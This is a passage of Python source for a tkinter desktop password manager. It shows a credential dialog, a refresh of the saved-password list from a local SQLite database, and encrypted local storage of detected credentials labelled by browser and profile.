                        current_value = entry_var.get()
                        
                        # Toggle between show and hide
                        entry.configure(show='' if current_show == '*' else '*')
                        entry_var.set(current_value)  # Restore the value
                    
                    def copy_value():
                        dialog.clipboard_clear()
                        dialog.clipboard_append(value)
                        messagebox.showinfo("Copied", "Value copied to clipboard")
                    
                    # Use descriptive button labels
                    ModernButton(frame, text="Show/Hide Password", 
                               command=toggle_visibility).pack(side='left', padx=5)
                    ModernButton(frame, text="Copy to Clipboard", 
                               command=copy_value).pack(side='left')
                else:
                    ttk.Label(frame, text=str(value if value else "")).pack(side='left')
    
    def refresh_password_list(self):
        """Refresh the password list"""
        if not hasattr(self, 'password_tree') or not self.password_tree:
            return
            
        for item in self.password_tree.get_children():
            self.password_tree.delete(item)
        
        try:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            cursor.execute("SELECT title, username, website, modified_date FROM passwords ORDER BY title")
            
            for row in cursor.fetchall():
                self.password_tree.insert('', 'end', values=row)
            
            conn.close()
        except Exception as e:
            print(f"Error refreshing password list: {e}")
    
    def handle_detected_credentials(self, url, username, password, metadata=None):
        """Handle detected credentials"""
        if not self.logged_in:
            return
        
        self.update_activity()
        encrypted = self.encrypt_password(password)
        if not encrypted:
            return
        
        now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        
        # If metadata contains created_date, use it
        created_date = now
        if metadata and 'created' in metadata:
            created_date = metadata['created']
        
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        # Add browser name to title if available
        title = url
        if metadata and 'browser' in metadata:
            title = f"{url} ({metadata['browser']})"
            if 'profile' in metadata:
                title += f" - {metadata['profile']}"
        
        cursor.execute("""
            INSERT INTO passwords (title, username, password, website, created_date, modified_date)
            VALUES (?, ?, ?, ?, ?, ?)
        """, (title, username, encrypted, url, created_date, now))
        conn.commit()
        conn.close()
        
        self.refresh_password_list()
    
    def clear_main_frame(self):
        """Clear all widgets from the main frame"""
        for widget in self.main_frame.winfo_children():
            widget.destroy()
    
    def run(self):
        """Run the application"""
        self.root.mainloop()

if __name__ == "__main__":
    try:
        app = PasswordManager()
        app.run()
    except Exception as e:
        print(f"Error starting Password Manager: {e}")
        raise
